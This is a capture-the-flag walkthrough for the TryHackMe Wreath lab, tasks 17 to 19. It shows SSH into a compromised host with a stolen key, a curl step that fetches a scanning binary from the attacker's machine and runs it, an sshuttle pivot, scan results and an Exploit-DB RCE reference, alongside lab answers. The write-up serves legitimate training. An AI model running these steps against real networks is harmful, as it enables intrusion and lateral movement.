# TryHackMe [Wreath](https://www.tryhackme.com/room/wreath) Task 17-19
### References
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 17: Git Server - Enumeration [YouTube Video]. In YouTube. https://youtu.be/Q5b60n-jkf0
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 18: Git Server - Pivoting [YouTube Video]. In YouTube. https://youtu.be/D2wSFFrpPQA
* DarkSec. (2021). TryHackMe Wreath Official Walkthrough Task 19: Git Server - Code Review [YouTube Video]. In YouTube. https://youtu.be/vnwUTeIXbxM
## Task 17: Enumeration
### Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?
```
ssh -i ../Task6/id_rsa root@10.200.100.200
[root@prod-serv ~]# wget http://10.50.101.82/nmap-AppleGamer22
-bash: wget: command not found
[root@prod-serv ~]# curl 10.50.101.82/nmap-AppleGamer22 -o ./nmap-AppleGamer22 && chmod +x nmap-AppleGamer22
[root@prod-serv ~]# mv /tmp/nmap-AppleGamer22 .
[root@prod-serv ~]# ./nmap-AppleGamer22 -sn 10.200.100.200/24
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-22 10:11 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-100-1.eu-west-1.compute.internal (10.200.100.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.15s latency).
MAC Address: 02:D2:70:A5:7E:E7 (Unknown)
Nmap scan report for ip-10-200-100-100.eu-west-1.compute.internal (10.200.100.100)
Host is up (0.00023s latency).
MAC Address: 02:18:FF:2F:29:A7 (Unknown)
Nmap scan report for ip-10-200-100-150.eu-west-1.compute.internal (10.200.100.150)
Host is up (0.00024s latency).
MAC Address: 02:45:52:53:90:C3 (Unknown)
Nmap scan report for ip-10-200-100-250.eu-west-1.compute.internal (10.200.100.250)
Host is up (0.00021s latency).
MAC Address: 02:7F:CE:B5:83:49 (Unknown)
Nmap scan report for ip-10-200-100-200.eu-west-1.compute.internal (10.200.100.200)
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 4.76 seconds
```
**Answer**: `2`
### In ascending order, what are the last octets of these host IPv4 addresses?
**Answer**: `100,150`
### Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?
```
[root@prod-serv ~]# ./nmap-AppleGamer22 10.200.100.100 10.200.100.150

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-22 10:18 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-100-100.eu-west-1.compute.internal (10.200.100.100)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.20s latency).
All 6150 scanned ports on ip-10-200-100-100.eu-west-1.compute.internal (10.200.100.100) are filtered
MAC Address: 02:18:FF:2F:29:A7 (Unknown)

Nmap scan report for ip-10-200-100-150.eu-west-1.compute.internal (10.200.100.150)
Host is up (0.00032s latency).
Not shown: 6146 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman
MAC Address: 02:45:52:53:90:C3 (Unknown)

Nmap done: 2 IP addresses (2 hosts up) scanned in 61.86 seconds
```
**Answer**: `150`
### Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
* *Hint*: Scan the first 15000 ports. In some instances port 5357 will also show as being open. If this is the case, please disregard it and use the other three.
**Answer**: `80,3389,5985`
### Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
**Answer**: `http`
## Task 18: Pivoting
### What is the name of the program running the service?
* `curl curl 10.200.100.150` returns an HTML page with `gitstack`
**Answer**: `gitstack`
### Do these default credentials work (Aye/Nay)?
![gitstack login page](https://assets.tryhackme.com/additional/wreath-network/409f76a17496.png)
1. Run `sudo sshuttle -r root@10.200.100.200 --ssh-cmd "ssh -i ../Task6/id_rsa" 10.200.100.0/24 -x 10.200.100.200` to connect to the target's HTTP port.
2. Go to `http://10.200.100.150/gitstack/` on your browser.

**Answer**: `Nay`
### What is the EDB ID number of Python RCE exploit for version 2.3.10 of GitStack?
* According to https://www.exploit-db.com/exploits/43777.

**Answer**: `43777`
## Task 19: Code Review
### Look at the information at the top of the script. On what date was this exploit written?
**Answer**: `18.01.2018`
### Is the exploit script written in Python2 or Python3?
**Answer**: `Python2`
### What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?
**Answer**: `csrftoken`
